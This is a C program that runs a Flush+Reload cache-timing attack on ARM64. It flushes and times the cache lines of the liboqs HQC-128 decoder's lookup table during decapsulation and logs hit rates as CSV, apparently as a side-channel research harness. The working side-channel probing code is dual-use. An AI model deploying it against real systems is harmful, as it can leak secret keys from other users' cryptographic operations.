#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <oqs/oqs.h>

extern const uint16_t alpha_ij_pow[30][45];

#define LINE_SIZE 64
#define TABLE_BYTES (30 * 45 * 2)
#define N_LINES ((TABLE_BYTES + LINE_SIZE - 1) / LINE_SIZE)

#define HIT_THRESHOLD 200

static int perf_fd = -1;

static int open_pmu(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;
    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { perror("perf_event_open"); return -1; }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    return fd;
}

static inline uint64_t rdcyc(void) {
    uint64_t c;
    if (read(perf_fd, &c, sizeof(c)) != sizeof(c)) return 0;
    return c;
}

static inline void cache_flush(volatile const void *addr) {
    asm volatile("dc civac, %0" :: "r"(addr) : "memory");
    asm volatile("dsb sy" ::: "memory");
}

static inline uint64_t timed_load(volatile const uint8_t *addr) {
    uint8_t v;
    asm volatile("dsb sy" ::: "memory");
    uint64_t t0 = rdcyc();
    asm volatile("ldrb %w0, [%1]\n dsb sy" : "=r"(v) : "r"(addr) : "memory");
    uint64_t t1 = rdcyc();
    return t1 - t0;
}

static volatile uint8_t sink;

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <n_decaps>\n", argv[0]);
        return 1;
    }
    long n = atol(argv[1]);

    perf_fd = open_pmu();
    if (perf_fd < 0) return 1;

    const uint8_t *table = (const uint8_t *)alpha_ij_pow;
    fprintf(stderr, "alpha_ij_pow at %p, %zu bytes, %d lines\n",
            (const void *)table, (size_t)TABLE_BYTES, N_LINES);

    OQS_KEM *kem = OQS_KEM_new(OQS_KEM_alg_hqc_128);
    if (!kem) { fprintf(stderr, "HQC-128 not enabled\n"); return 1; }

    uint8_t *pk = malloc(kem->length_public_key);
    uint8_t *sk = malloc(kem->length_secret_key);
    uint8_t *ct = malloc(kem->length_ciphertext);
    uint8_t *ss = malloc(kem->length_shared_secret);
    uint8_t *ss_enc = malloc(kem->length_shared_secret);

    OQS_KEM_keypair(kem, pk, sk);
    OQS_KEM_encaps(kem, ct, ss_enc, pk);

    for (int i = 0; i < 1000; i++) {
        OQS_KEM_decaps(kem, ss, ct, sk);
        sink ^= ss[0];
    }

    long hit_count[N_LINES];
    memset(hit_count, 0, sizeof(hit_count));

    printf("decap_idx");
    for (int l = 0; l < N_LINES; l++) printf(",line_%d", l);
    printf("\n");

    fprintf(stderr, "Starting %ld Flush+Reload measurements...\n", n);

    for (long it = 0; it < n; it++) {
        for (int l = 0; l < N_LINES; l++) {
            cache_flush(table + l * LINE_SIZE);
        }
        asm volatile("dsb sy" ::: "memory");

        OQS_KEM_decaps(kem, ss, ct, sk);
        sink ^= ss[0];

        printf("%ld", it);
        for (int l = 0; l < N_LINES; l++) {
            uint64_t t = timed_load(table + l * LINE_SIZE);
            int is_hit = (t < HIT_THRESHOLD);
            if (is_hit) hit_count[l]++;
            printf(",%d", is_hit);
        }
        printf("\n");

        if ((it + 1) % 1000 == 0) {
            fprintf(stderr, "  %ld / %ld\n", it + 1, n);
        }
    }

    fprintf(stderr, "\nLine | Hits | Hit rate\n");
    fprintf(stderr, "-----+------+--------\n");
    for (int l = 0; l < N_LINES; l++) {
        fprintf(stderr, "%4d | %4ld | %5.1f%%\n",
                l, hit_count[l], 100.0 * hit_count[l] / n);
    }

    fprintf(stderr, "\nSink: %u\n", sink);
    close(perf_fd);
    OQS_KEM_free(kem);
    free(pk); free(sk); free(ct); free(ss); free(ss_enc);
    return 0;
}
